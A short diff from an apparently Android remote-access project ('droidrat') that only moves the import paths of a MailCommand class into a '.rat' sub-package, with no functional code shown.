@@ -1,8 +1,8 @@
 package com.je_chen.droidrat_je.command;
 
-import com.je_chen.droidrat_je.command.process_super.CommandFather;
-import com.je_chen.droidrat_je.command.process_super.CommandProcessInterface;
-import com.je_chen.droidrat_je.modules.appintent.mail.SendMail;
+import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
+import com.je_chen.droidrat_je.rat.command.process_super.CommandProcessInterface;
+import com.je_chen.droidrat_je.rat.modules.appintent.mail.SendMail;
 
 public class MailCommand extends CommandFather implements CommandProcessInterface {
 
